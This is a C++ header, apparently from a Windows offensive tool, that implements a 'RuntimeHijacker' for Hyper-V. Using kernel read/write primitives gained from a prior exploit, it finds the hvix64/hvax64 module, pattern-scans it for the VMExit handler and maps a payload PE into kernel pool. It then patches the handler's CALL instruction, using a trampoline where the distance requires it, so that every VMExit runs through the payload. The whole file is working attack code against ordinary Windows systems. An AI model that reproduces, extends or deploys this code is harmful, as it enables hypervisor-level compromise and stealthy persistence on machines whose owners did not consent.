#pragma once
#include "zerohvci.h"
#include "exploit.h"      // For ReadKernelMemory/WriteKernelMemory after exploit
#include "kforge.h"       // For kernel function calling
#include "ntdefs.h"
#include "utils.h"
#include "version_detect.h"  // Windows version detection and signature database
#include "trampoline.h"      // Trampoline for >2GB jumps
#include <Windows.h>
#include <intrin.h>       // For __cpuid
#include <cstdio>
#include <cstdint>
#include <vector>

namespace zerohvci {
namespace hyperv {

// Legacy VMExit handler signatures (fallback if version detection fails)
// These are for Windows 10/11 22H2 - the most common current version
#define INTEL_VMEXIT_HANDLER_SIG "\x65\xC6\x04\x25\x6D\x00\x00\x00\x00\x48\x8B\x4C\x24\x00\x48\x8B\x54\x24\x00\xE8\x00\x00\x00\x00\xE9"
#define INTEL_VMEXIT_HANDLER_MASK "xxxxxxxxxxxxx?xxxx?x????x"
#define INTEL_CALL_OFFSET 19  // Offset to CALL instruction (default for 22H2)

#define AMD_VMEXIT_HANDLER_SIG "\xE8\x00\x00\x00\x00\x48\x89\x04\x24\xE9"
#define AMD_VMEXIT_HANDLER_MASK "x????xxxxx"
#define AMD_CALL_OFFSET 0  // CALL is at pattern start

// AMD VMCB offset pattern
#define AMD_VMCB_OFFSETS_SIG "\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8B\x88\x00\x00\x00\x00\x48\x8B\x81\x00\x00\x00\x00\x48\x8B\x88"
#define AMD_VMCB_OFFSETS_MASK "xxxxx????xxx????xxx????xxx"

// KUSER_SHARED_DATA address and hypervisor offset
#define KUSER_SHARED_DATA_ADDRESS 0xFFFFF78000000000ULL
#define HYPERVISOR_SHARED_DATA_OFFSET 0x2EC

// LDR_DATA_TABLE_ENTRY offsets (Windows 10/11)
#define LDR_ENTRY_DLLBASE_OFFSET 0x30
#define LDR_ENTRY_SIZEOFIMAGE_OFFSET 0x40
#define LDR_ENTRY_BASENAME_OFFSET 0x58

// OMBRA_T structure for payload context (matches PayLoad definition)
#pragma pack(push, 1)
typedef struct _RUNTIME_OMBRA_T
{
    UINT64 VmExitHandlerRva;      // RVA: &vmexit_handler - &original_handler (for Intel) or vcpu_run_rva (for AMD)
    UINT64 HypervModuleBase;      // Base address of hv.exe
    UINT64 HypervModuleSize;      // Size of hv.exe
    UINT64 ModuleBase;            // Base address of mapped payload
    UINT64 ModuleSize;            // Size of payload
    // AMD-specific fields
    UINT32 VmcbBase;              // GS-relative offset to VMCB pointer
    UINT32 VmcbLink;              // Additional VMCB link offset
    UINT32 VmcbOff;               // Final VMCB offset
    // Version-specific fields (added for multi-version support)
    UINT32 WindowsBuild;          // Windows build number (e.g., 19041, 22621)
    UINT8 IndirectContext;        // 1 if context is pointer-to-pointer (builds >= 17763), 0 otherwise
    UINT8 HookLen;                // Hook instruction length (5 or 8 bytes)
    UINT16 Reserved;              // Padding for alignment
} RUNTIME_OMBRA_T, *PRUNTIME_OMBRA_T;
#pragma pack(pop)

// Hyper-V module information
struct HyperVModuleInfo
{
    UINT64 BaseAddress;
    UINT32 SizeOfImage;
    bool IsIntel;
    UINT64 VmExitCallAddr;        // Address of CALL instruction to patch
    UINT64 OriginalHandler;       // Original VMExit handler address
};

// Runtime hijacker class
class RuntimeHijacker
{
public:
    RuntimeHijacker() = default;
    ~RuntimeHijacker() = default;

    // Initialize the hijacker (requires ZeroHVCI to be initialized first)
    bool Initialize();

    // Hijack Hyper-V with the provided payload DLL
    bool HijackHyperV(const BYTE* payloadData, size_t payloadSize);

    // Get status information
    bool IsInitialized() const { return m_initialized; }
    bool IsIntel() const { return m_hvInfo.IsIntel; }
    UINT64 GetPayloadBase() const { return m_payloadBase; }
    UINT64 GetOriginalHandler() const { return m_hvInfo.OriginalHandler; }
    const HyperVModuleInfo& GetHyperVInfo() const { return m_hvInfo; }

    // Trampoline status
    bool UsesTrampoline() const { return m_usesTrampoline; }
    UINT64 GetTrampolineAddr() const { return m_trampolineAddr; }

    // Version-specific hook parameters
    bool RequiresIndirectContext() const { return m_indirectContext; }
    UINT32 GetHookLen() const { return m_hookLen; }

private:
    // Internal initialization steps
    bool VerifyHyperVPresence();
    bool DetectCpuVendor();
    bool FindHyperVModule();
    bool FindVmExitHandler();

    // Payload operations
    UINT64 AllocatePayloadMemory(size_t size);
    bool MapPayloadToKernel(const BYTE* payloadData, size_t payloadSize);
    bool PopulateOmbraContext();
    bool PatchVmExitHandler();

    // Helper functions
    UINT64 GetPsLoadedModuleList();
    bool PatternMatch(const BYTE* data, const char* pattern, const char* mask, size_t patternLen);
    UINT64 FindPatternInKernel(UINT64 baseAddr, size_t size, const char* pattern, const char* mask);
    UINT64 GetPayloadExportOffset(const char* exportName);

    // Auto-discovery helpers (Option 1 - Hybrid approach)
    bool ValidateCallTarget(UINT64 callAddr, UINT64 callTarget);
    bool AutoDiscoverCallOffset(size_t patternPos, const version::VmExitSignature* sig,
                                UINT64& outCallAddr, UINT64& outOriginalHandler);

    // State
    bool m_initialized = false;
    HyperVModuleInfo m_hvInfo = {};
    UINT64 m_payloadBase = 0;
    size_t m_payloadSize = 0;
    std::vector<BYTE> m_localHvCopy;  // Local copy of hv.exe for scanning
    std::vector<BYTE> m_payloadCopy;  // Local copy of payload for parsing

    // Trampoline state (for >2GB payloads)
    UINT64 m_trampolineAddr = 0;
    bool m_usesTrampoline = false;

    // Version-specific hook parameters
    bool m_indirectContext = false;   // True for builds >= 17763 (context is pointer-to-pointer)
    UINT32 m_hookLen = 5;             // Hook length (5 or 8 bytes depending on version)
};

// Inline implementation

inline bool RuntimeHijacker::Initialize()
{
    if (m_initialized)
    {
        printf("[+] RuntimeHijacker already initialized\n");
        return true;
    }

    // ZeroHVCI must be initialized first
    if (!zerohvci::IsInitialized())
    {
        printf("[-] ZeroHVCI not initialized - call zerohvci::Initialize() first\n");
        return false;
    }

    printf("[*] Initializing RuntimeHijacker...\n");

    // Step 0: Detect Windows version (for signature selection)
    printf("[*] Step 0: Detecting Windows version...\n");
    if (version::DetectWindowsVersion())
    {
        printf("[+] Windows %u.%u Build %u (%s)\n",
            version::g_VersionInfo.MajorVersion,
            version::g_VersionInfo.MinorVersion,
            version::g_VersionInfo.BuildNumber,
            version::GetVersionName(version::g_VersionInfo.BuildNumber));
    }
    else
    {
        printf("[!] Could not detect Windows version - will use legacy signatures\n");
    }

    // Step 1: Verify Hyper-V is present
    printf("[*] Step 1: Verifying Hyper-V presence...\n");
    if (!VerifyHyperVPresence())
    {
        printf("[-] Hyper-V not detected or not running\n");
        return false;
    }
    printf("[+] Hyper-V is active\n");

    // Step 2: Detect CPU vendor
    printf("[*] Step 2: Detecting CPU vendor...\n");
    if (!DetectCpuVendor())
    {
        printf("[-] Failed to detect CPU vendor\n");
        return false;
    }
    printf("[+] CPU: %s\n", m_hvInfo.IsIntel ? "Intel (VMX)" : "AMD (SVM)");

    // Step 3: Find Hyper-V module (hvix64.exe or hvax64.exe)
    printf("[*] Step 3: Finding Hyper-V module...\n");
    if (!FindHyperVModule())
    {
        printf("[-] Failed to find Hyper-V module\n");
        return false;
    }
    printf("[+] Found %s at 0x%llX (size: 0x%X)\n",
        m_hvInfo.IsIntel ? "hvix64.exe" : "hvax64.exe",
        m_hvInfo.BaseAddress, m_hvInfo.SizeOfImage);

    // Step 4: Find VMExit handler
    printf("[*] Step 4: Scanning for VMExit handler...\n");
    if (!FindVmExitHandler())
    {
        printf("[-] Failed to find VMExit handler pattern\n");
        return false;
    }
    printf("[+] VMExit CALL at 0x%llX, original handler at 0x%llX\n",
        m_hvInfo.VmExitCallAddr, m_hvInfo.OriginalHandler);

    m_initialized = true;
    printf("[+] RuntimeHijacker initialization complete\n");
    return true;
}

inline bool RuntimeHijacker::VerifyHyperVPresence()
{
    // Read KUSER_SHARED_DATA hypervisor shared data field
    UINT64 hvSharedData = 0;
    if (!ReadKernelMemory(
        (PVOID)(KUSER_SHARED_DATA_ADDRESS + HYPERVISOR_SHARED_DATA_OFFSET),
        &hvSharedData, sizeof(hvSharedData)))
    {
        return false;
    }
    return hvSharedData != 0;
}

inline bool RuntimeHijacker::DetectCpuVendor()
{
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0);

    char vendor[13];
    *(int*)(vendor + 0) = cpuInfo[1];
    *(int*)(vendor + 4) = cpuInfo[3];
    *(int*)(vendor + 8) = cpuInfo[2];
    vendor[12] = '\0';

    if (strncmp(vendor, "GenuineIntel", 12) == 0)
    {
        m_hvInfo.IsIntel = true;
        return true;
    }
    else if (strncmp(vendor, "AuthenticAMD", 12) == 0)
    {
        m_hvInfo.IsIntel = false;
        return true;
    }

    printf("[-] Unknown CPU vendor: %s\n", vendor);
    return false;
}

inline bool RuntimeHijacker::FindHyperVModule()
{
    // Get PsLoadedModuleList address
    UINT64 pPsLoadedModuleList = GetPsLoadedModuleList();
    if (!pPsLoadedModuleList)
    {
        printf("[-] Failed to get PsLoadedModuleList address\n");
        return false;
    }

    // Read list head (first entry)
    UINT64 listHead = 0;
    if (!ReadKernelMemory((PVOID)pPsLoadedModuleList, &listHead, sizeof(listHead)))
    {
        return false;
    }

    const wchar_t* targetModule = m_hvInfo.IsIntel ? L"hvix64.exe" : L"hvax64.exe";
    UINT64 current = listHead;

    // Walk the loaded module list
    do
    {
        // Read LDR_DATA_TABLE_ENTRY fields
        UINT64 dllBase = 0;
        UINT32 sizeOfImage = 0;
        wchar_t baseName[256] = { 0 };

        if (!ReadKernelMemory((PVOID)(current + LDR_ENTRY_DLLBASE_OFFSET), &dllBase, sizeof(dllBase)))
            break;
        if (!ReadKernelMemory((PVOID)(current + LDR_ENTRY_SIZEOFIMAGE_OFFSET), &sizeOfImage, sizeof(sizeOfImage)))
            break;

        // Read UNICODE_STRING BaseDllName
        UINT16 nameLen = 0;
        UINT64 namePtr = 0;
        if (!ReadKernelMemory((PVOID)(current + LDR_ENTRY_BASENAME_OFFSET), &nameLen, sizeof(nameLen)))
            break;
        if (!ReadKernelMemory((PVOID)(current + LDR_ENTRY_BASENAME_OFFSET + 8), &namePtr, sizeof(namePtr)))
            break;

        if (nameLen > 0 && namePtr)
        {
            UINT16 readLen = min(nameLen, (UINT16)(sizeof(baseName) - 2));
            if (ReadKernelMemory((PVOID)namePtr, baseName, readLen))
            {
                if (_wcsicmp(baseName, targetModule) == 0)
                {
                    m_hvInfo.BaseAddress = dllBase;
                    m_hvInfo.SizeOfImage = sizeOfImage;
                    return true;
                }
            }
        }

        // Follow Flink (first entry in LIST_ENTRY)
        UINT64 nextEntry = 0;
        if (!ReadKernelMemory((PVOID)current, &nextEntry, sizeof(nextEntry)))
            break;

        current = nextEntry;

    } while (current != listHead && current != 0);

    return false;
}

inline UINT64 RuntimeHijacker::GetPsLoadedModuleList()
{
    // PsLoadedModuleList is exported by ntoskrnl.exe
    // We can find it via our kernel image mapping
    return LeakGadgetAddress("PsLoadedModuleList");
}

// Helper: Validate that a discovered CALL target is reasonable
inline bool RuntimeHijacker::ValidateCallTarget(UINT64 callAddr, UINT64 callTarget)
{
    // The target should be within hv.exe or a reasonable kernel range
    if (callTarget >= m_hvInfo.BaseAddress &&
        callTarget < m_hvInfo.BaseAddress + m_hvInfo.SizeOfImage)
    {
        return true;  // Target is within hv.exe - definitely valid
    }

    // Also accept targets in high kernel space (above 0xFFFFF80000000000)
    if (callTarget >= 0xFFFFF80000000000ULL)
    {
        return true;
    }

    return false;
}

// Helper: Scan for CALL opcode within a range and validate target
inline bool RuntimeHijacker::AutoDiscoverCallOffset(
    size_t patternPos,
    const version::VmExitSignature* sig,
    UINT64& outCallAddr,
    UINT64& outOriginalHandler)
{
    printf("[*] Auto-discovering CALL offset (scanning 0x%X - 0x%X from pattern)...\n",
        sig->ScanRangeStart, sig->ScanRangeEnd);

    // Scan within the specified range for the CALL opcode
    for (uint32_t offset = sig->ScanRangeStart; offset < sig->ScanRangeEnd; offset++)
    {
        size_t scanPos = patternPos + offset;
        if (scanPos + 5 >= m_hvInfo.SizeOfImage)
            break;

        // Check for CALL opcode
        if (m_localHvCopy[scanPos] == sig->CallOpcode)
        {
            // Read the 4-byte relative offset
            INT32 relOffset = *(INT32*)(m_localHvCopy.data() + scanPos + 1);

            // Calculate absolute target address
            UINT64 callAddr = m_hvInfo.BaseAddress + scanPos;
            UINT64 callRip = callAddr + 5;  // RIP after CALL instruction
            UINT64 targetAddr = callRip + relOffset;

            // Validate the target
            if (ValidateCallTarget(callAddr, targetAddr))
            {
                printf("[+] Auto-discovered CALL at offset 0x%zX (target: 0x%llX)\n",
                    scanPos, targetAddr);

                outCallAddr = callAddr;
                outOriginalHandler = targetAddr;
                return true;
            }
        }
    }

    printf("[!] Auto-discovery failed - falling back to static offset 0x%X\n", sig->CallOffset);
    return false;
}

inline bool RuntimeHijacker::FindVmExitHandler()
{
    // Read entire hv.exe into usermode buffer for pattern scanning
    m_localHvCopy.resize(m_hvInfo.SizeOfImage);
    if (!ReadKernelMemory((PVOID)m_hvInfo.BaseAddress, m_localHvCopy.data(), m_hvInfo.SizeOfImage))
    {
        printf("[-] Failed to read hv.exe into local buffer\n");
        return false;
    }

    // First, try version-specific signature from database
    if (version::g_VersionInfo.BuildNumber != 0)
    {
        printf("[*] Looking up signature for Windows build %u (%s)...\n",
            version::g_VersionInfo.BuildNumber,
            m_hvInfo.IsIntel ? "Intel" : "AMD");

        const version::VmExitSignature* sig = version::FindVmExitSignature(
            version::g_VersionInfo.BuildNumber, m_hvInfo.IsIntel);

        if (sig)
        {
            printf("[+] Found version-specific signature (builds %u-%u)\n",
                sig->MinBuild, sig->MaxBuild);
            printf("[*] AutoDiscoverCall: %s\n", sig->AutoDiscoverCall ? "enabled" : "disabled");

            // Scan using the versioned signature
            for (size_t i = 0; i < m_hvInfo.SizeOfImage - sig->PatternLen; i++)
            {
                bool match = true;
                for (size_t j = 0; j < sig->PatternLen && match; j++)
                {
                    if (sig->Mask[j] == 'x' && m_localHvCopy[i + j] != sig->Pattern[j])
                        match = false;
                }

                if (match)
                {
                    printf("[+] Pattern matched at offset 0x%zX\n", i);

                    UINT64 patternAddr = m_hvInfo.BaseAddress + i;
                    bool callFound = false;

                    // Try auto-discovery first if enabled
                    if (sig->AutoDiscoverCall)
                    {
                        callFound = AutoDiscoverCallOffset(i, sig,
                            m_hvInfo.VmExitCallAddr, m_hvInfo.OriginalHandler);
                    }

                    // Fall back to static offset if auto-discovery failed or was disabled
                    if (!callFound)
                    {
                        m_hvInfo.VmExitCallAddr = patternAddr + sig->CallOffset;

                        // Read current RVA to find original handler
                        UINT64 callRip = m_hvInfo.VmExitCallAddr + 5;
                        size_t localOffset = i + sig->CallOffset + 1;
                        if (localOffset + 4 <= m_localHvCopy.size())
                        {
                            INT32 currentRva = *(INT32*)(m_localHvCopy.data() + localOffset);
                            m_hvInfo.OriginalHandler = callRip + currentRva;
                            printf("[+] Using static CallOffset 0x%X -> target 0x%llX\n",
                                sig->CallOffset, m_hvInfo.OriginalHandler);
                        }
                        else
                        {
                            printf("[-] Static CallOffset would read out of bounds\n");
                            continue;  // Try next pattern match
                        }
                    }

                    // Store version-specific flags
                    m_indirectContext = sig->IndirectContext;
                    m_hookLen = sig->HookLen;

                    printf("[+] VMExit handler found (IndirectContext=%s, HookLen=%u)\n",
                        m_indirectContext ? "true" : "false", m_hookLen);

                    return true;
                }
            }
            printf("[!] Version-specific signature not found, falling back to legacy patterns\n");
        }
        else
        {
            printf("[!] No signature in database for build %u, using legacy patterns\n",
                version::g_VersionInfo.BuildNumber);
        }
    }
    else
    {
        printf("[!] Windows version not detected, using legacy patterns\n");
    }

    // Fallback: Use legacy hardcoded signatures (22H2)
    const char* pattern = m_hvInfo.IsIntel ? INTEL_VMEXIT_HANDLER_SIG : AMD_VMEXIT_HANDLER_SIG;
    const char* mask = m_hvInfo.IsIntel ? INTEL_VMEXIT_HANDLER_MASK : AMD_VMEXIT_HANDLER_MASK;
    size_t patternLen = strlen(mask);
    int callOffset = m_hvInfo.IsIntel ? INTEL_CALL_OFFSET : AMD_CALL_OFFSET;

    // Scan for pattern
    for (size_t i = 0; i < m_hvInfo.SizeOfImage - patternLen; i++)
    {
        if (PatternMatch(m_localHvCopy.data() + i, pattern, mask, patternLen))
        {
            // Found pattern - calculate addresses
            UINT64 patternAddr = m_hvInfo.BaseAddress + i;
            m_hvInfo.VmExitCallAddr = patternAddr + callOffset;

            // Read current RVA to find original handler
            UINT64 callRip = m_hvInfo.VmExitCallAddr + 5;
            INT32 currentRva = *(INT32*)(m_localHvCopy.data() + i + callOffset + 1);
            m_hvInfo.OriginalHandler = callRip + currentRva;

            // Legacy patterns are for 22H2 which requires IndirectContext
            m_indirectContext = version::RequiresIndirectContext(version::g_VersionInfo.BuildNumber);
            m_hookLen = 5;  // Default hook length

            printf("[+] Legacy pattern matched at offset 0x%zX\n", i);

            return true;
        }
    }

    return false;
}

inline bool RuntimeHijacker::PatternMatch(const BYTE* data, const char* pattern, const char* mask, size_t patternLen)
{
    for (size_t i = 0; i < patternLen; i++)
    {
        if (mask[i] == 'x' && data[i] != (BYTE)pattern[i])
            return false;
    }
    return true;
}

inline bool RuntimeHijacker::HijackHyperV(const BYTE* payloadData, size_t payloadSize)
{
    if (!m_initialized)
    {
        printf("[-] RuntimeHijacker not initialized\n");
        return false;
    }

    printf("[*] Beginning Hyper-V hijack...\n");

    // Save payload copy for later reference
    m_payloadCopy.assign(payloadData, payloadData + payloadSize);

    // Step 1: Allocate kernel memory for payload
    printf("[*] Step 1: Allocating kernel pool for payload...\n");
    m_payloadBase = AllocatePayloadMemory(payloadSize);
    if (!m_payloadBase)
    {
        printf("[-] Failed to allocate payload memory\n");
        return false;
    }
    m_payloadSize = payloadSize;
    printf("[+] Payload memory allocated at 0x%llX\n", m_payloadBase);

    // Step 2: Map payload to kernel
    printf("[*] Step 2: Mapping payload to kernel...\n");
    if (!MapPayloadToKernel(payloadData, payloadSize))
    {
        printf("[-] Failed to map payload\n");
        return false;
    }
    printf("[+] Payload mapped successfully\n");

    // Step 3: Populate ombra_context in payload
    printf("[*] Step 3: Populating ombra_context...\n");
    if (!PopulateOmbraContext())
    {
        printf("[-] Failed to populate ombra_context\n");
        return false;
    }
    printf("[+] ombra_context populated\n");

    // Step 4: Patch VMExit handler CALL
    printf("[*] Step 4: Patching VMExit handler...\n");
    if (!PatchVmExitHandler())
    {
        printf("[-] Failed to patch VMExit handler\n");
        return false;
    }
    printf("[+] VMExit handler patched - ALL VMExits now route through payload!\n");

    printf("[+] Hyper-V hijack complete\n");
    return true;
}

inline UINT64 RuntimeHijacker::AllocatePayloadMemory(size_t size)
{
    // Use KernelForge to call ExAllocatePool
    // Round up to page size
    size_t alignedSize = (size + 0xFFF) & ~0xFFF;
    return (UINT64)zerohvci::AllocateKernelPool(alignedSize);
}

inline bool RuntimeHijacker::MapPayloadToKernel(const BYTE* payloadData, size_t payloadSize)
{
    // Parse PE headers
    const IMAGE_DOS_HEADER* dosHeader = (const IMAGE_DOS_HEADER*)payloadData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("[-] Invalid DOS signature\n");
        return false;
    }

    const IMAGE_NT_HEADERS64* ntHeaders = (const IMAGE_NT_HEADERS64*)(payloadData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[-] Invalid NT signature\n");
        return false;
    }

    // Copy headers
    if (!WriteKernelMemory((PVOID)m_payloadBase, (PVOID)payloadData, ntHeaders->OptionalHeader.SizeOfHeaders))
    {
        printf("[-] Failed to copy PE headers\n");
        return false;
    }

    // Copy sections
    const IMAGE_SECTION_HEADER* sections = (const IMAGE_SECTION_HEADER*)(
        (BYTE*)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);

    for (UINT16 i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        const IMAGE_SECTION_HEADER* section = &sections[i];
        if (section->SizeOfRawData)
        {
            UINT64 sectionDst = m_payloadBase + section->VirtualAddress;
            const BYTE* sectionSrc = payloadData + section->PointerToRawData;

            if (!WriteKernelMemory((PVOID)sectionDst, (PVOID)sectionSrc, section->SizeOfRawData))
            {
                printf("[-] Failed to copy section %.8s\n", section->Name);
                return false;
            }
        }
    }

    // Process relocations
    const IMAGE_DATA_DIRECTORY* baseRelocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (baseRelocDir->VirtualAddress && baseRelocDir->Size)
    {
        // Read relocation data from kernel (we just wrote it)
        std::vector<BYTE> relocData(baseRelocDir->Size);
        if (!ReadKernelMemory((PVOID)(m_payloadBase + baseRelocDir->VirtualAddress), relocData.data(), baseRelocDir->Size))
        {
            printf("[-] Failed to read relocation data\n");
            return false;
        }

        UINT64 delta = m_payloadBase - ntHeaders->OptionalHeader.ImageBase;
        const IMAGE_BASE_RELOCATION* reloc = (const IMAGE_BASE_RELOCATION*)relocData.data();

        for (UINT32 currentSize = 0; currentSize < baseRelocDir->Size; )
        {
            UINT32 relocCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(UINT16);
            const UINT16* relocEntries = (const UINT16*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
            UINT64 relocBase = m_payloadBase + reloc->VirtualAddress;

            for (UINT32 j = 0; j < relocCount; j++)
            {
                UINT16 data = relocEntries[j];
                UINT16 type = data >> 12;
                UINT16 offset = data & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64)
                {
                    UINT64 addr = relocBase + offset;
                    UINT64 value = 0;

                    if (!ReadKernelMemory((PVOID)addr, &value, sizeof(value)))
                        continue;

                    value += delta;

                    if (!WriteKernelMemory((PVOID)addr, &value, sizeof(value)))
                        continue;
                }
            }

            currentSize += reloc->SizeOfBlock;
            reloc = (const IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    return true;
}

inline UINT64 RuntimeHijacker::GetPayloadExportOffset(const char* exportName)
{
    // Parse export directory from local payload copy
    const IMAGE_DOS_HEADER* dosHeader = (const IMAGE_DOS_HEADER*)m_payloadCopy.data();
    const IMAGE_NT_HEADERS64* ntHeaders = (const IMAGE_NT_HEADERS64*)(m_payloadCopy.data() + dosHeader->e_lfanew);

    const IMAGE_DATA_DIRECTORY* exportDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exportDir->VirtualAddress)
        return 0;

    const IMAGE_EXPORT_DIRECTORY* exports = (const IMAGE_EXPORT_DIRECTORY*)(m_payloadCopy.data() + exportDir->VirtualAddress);
    const UINT32* names = (const UINT32*)(m_payloadCopy.data() + exports->AddressOfNames);
    const UINT16* ordinals = (const UINT16*)(m_payloadCopy.data() + exports->AddressOfNameOrdinals);
    const UINT32* functions = (const UINT32*)(m_payloadCopy.data() + exports->AddressOfFunctions);

    for (UINT32 i = 0; i < exports->NumberOfNames; i++)
    {
        const char* name = (const char*)(m_payloadCopy.data() + names[i]);
        if (strcmp(name, exportName) == 0)
        {
            return functions[ordinals[i]];
        }
    }

    return 0;
}

inline bool RuntimeHijacker::PopulateOmbraContext()
{
    // Find ombra_context export
    UINT64 contextOffset = GetPayloadExportOffset("ombra_context");
    if (!contextOffset)
    {
        printf("[-] Could not find ombra_context export\n");
        return false;
    }

    // Find vmexit_handler export
    UINT64 vmexitHandlerOffset = GetPayloadExportOffset("vmexit_handler");
    if (!vmexitHandlerOffset)
    {
        printf("[-] Could not find vmexit_handler export\n");
        return false;
    }

    // Build the context structure
    RUNTIME_OMBRA_T ctx = { 0 };
    ctx.HypervModuleBase = m_hvInfo.BaseAddress;
    ctx.HypervModuleSize = m_hvInfo.SizeOfImage;
    ctx.ModuleBase = m_payloadBase;
    ctx.ModuleSize = m_payloadSize;

    // Calculate RVA from our handler to original handler
    UINT64 payloadEntry = m_payloadBase + vmexitHandlerOffset;
    ctx.VmExitHandlerRva = payloadEntry - m_hvInfo.OriginalHandler;

    // For AMD, extract VMCB offsets from hv.exe
    if (!m_hvInfo.IsIntel)
    {
        // Find VMCB offset pattern
        size_t patternLen = strlen(AMD_VMCB_OFFSETS_MASK);
        for (size_t i = 0; i < m_hvInfo.SizeOfImage - patternLen; i++)
        {
            if (PatternMatch(m_localHvCopy.data() + i, AMD_VMCB_OFFSETS_SIG, AMD_VMCB_OFFSETS_MASK, patternLen))
            {
                size_t offset = i + 5;
                ctx.VmcbBase = *(UINT32*)(m_localHvCopy.data() + offset);
                offset += 3 + 4;
                ctx.VmcbLink = *(UINT32*)(m_localHvCopy.data() + offset);
                offset += 3 + 4;
                ctx.VmcbOff = *(UINT32*)(m_localHvCopy.data() + offset);
                break;
            }
        }
    }

    // Populate version-specific fields
    ctx.WindowsBuild = version::g_VersionInfo.BuildNumber;
    ctx.IndirectContext = m_indirectContext ? 1 : 0;
    ctx.HookLen = (UINT8)m_hookLen;
    ctx.Reserved = 0;

    // Write context to payload
    UINT64 contextAddr = m_payloadBase + contextOffset;
    if (!WriteKernelMemory((PVOID)contextAddr, &ctx, sizeof(ctx)))
    {
        printf("[-] Failed to write ombra_context\n");
        return false;
    }

    printf("[+] ombra_context written at 0x%llX\n", contextAddr);
    printf("    VmExitHandlerRva: 0x%llX\n", ctx.VmExitHandlerRva);
    printf("    HypervModuleBase: 0x%llX\n", ctx.HypervModuleBase);
    printf("    ModuleBase: 0x%llX\n", ctx.ModuleBase);
    printf("    WindowsBuild: %u\n", ctx.WindowsBuild);
    printf("    IndirectContext: %s\n", ctx.IndirectContext ? "true" : "false");
    printf("    HookLen: %u\n", ctx.HookLen);

    return true;
}

inline bool RuntimeHijacker::PatchVmExitHandler()
{
    // Find vmexit_handler export offset
    UINT64 vmexitHandlerOffset = GetPayloadExportOffset("vmexit_handler");
    if (!vmexitHandlerOffset)
    {
        printf("[-] Could not find vmexit_handler export\n");
        return false;
    }

    UINT64 payloadEntry = m_payloadBase + vmexitHandlerOffset;
    UINT64 callRip = m_hvInfo.VmExitCallAddr + 5;  // RIP after CALL instruction

    // Calculate new RVA
    INT64 newRva64 = (INT64)payloadEntry - (INT64)callRip;

    // Verify 32-bit range - if payload is >2GB away, use trampoline
    if (newRva64 > INT32_MAX || newRva64 < INT32_MIN)
    {
        printf("[!] Jump offset 0x%llX exceeds 32-bit range - allocating trampoline\n", newRva64);
        printf("[*] Payload at 0x%llX is too far from hv.exe at 0x%llX\n",
            payloadEntry, m_hvInfo.BaseAddress);

        // Use trampoline mechanism to bridge the >2GB gap
        trampoline::TrampolineInfo trampInfo = trampoline::AllocateTrampoline(
            payloadEntry,           // Where we ultimately want to jump
            callRip,                // RIP after the CALL instruction
            m_hvInfo.BaseAddress,   // hv.exe base for slack space search
            m_hvInfo.SizeOfImage,   // hv.exe size
            m_localHvCopy           // Local copy for scanning
        );

        if (!trampInfo.Success)
        {
            printf("[-] CRITICAL: Trampoline allocation failed\n");
            printf("[-] Cannot hijack Hyper-V - payload too far from hv.exe\n");
            return false;
        }

        // Print trampoline debug info
        trampoline::PrintTrampolineInfo(trampInfo);

        // Verify trampoline was written correctly
        if (trampInfo.TrampolineAddr != payloadEntry)  // Only verify if we actually used trampoline
        {
            if (!trampoline::VerifyTrampoline(trampInfo.TrampolineAddr))
            {
                printf("[-] Trampoline verification failed\n");
                return false;
            }
        }

        // Use the trampoline's RVA for the patch
        INT32 newRva = trampInfo.CallRva;

        printf("[*] Patching CALL at 0x%llX: RVA 0x%08X -> 0x%08X (via trampoline)\n",
            m_hvInfo.VmExitCallAddr,
            *(INT32*)(m_localHvCopy.data() + (m_hvInfo.VmExitCallAddr - m_hvInfo.BaseAddress) + 1),
            newRva);

        // Write the 4-byte RVA patch
        if (!WriteKernelMemory((PVOID)(m_hvInfo.VmExitCallAddr + 1), &newRva, sizeof(newRva)))
        {
            printf("[-] Failed to write RVA patch\n");
            return false;
        }

        m_trampolineAddr = trampInfo.TrampolineAddr;
        m_usesTrampoline = true;
        return true;
    }

    // Direct patch - payload is within 2GB of hv.exe
    INT32 newRva = (INT32)newRva64;

    printf("[*] Patching CALL at 0x%llX: RVA 0x%08X -> 0x%08X (direct)\n",
        m_hvInfo.VmExitCallAddr,
        *(INT32*)(m_localHvCopy.data() + (m_hvInfo.VmExitCallAddr - m_hvInfo.BaseAddress) + 1),
        newRva);

    // Write the 4-byte RVA patch
    if (!WriteKernelMemory((PVOID)(m_hvInfo.VmExitCallAddr + 1), &newRva, sizeof(newRva)))
    {
        printf("[-] Failed to write RVA patch\n");
        return false;
    }

    m_usesTrampoline = false;
    return true;
}

} // namespace hyperv
} // namespace zerohvci
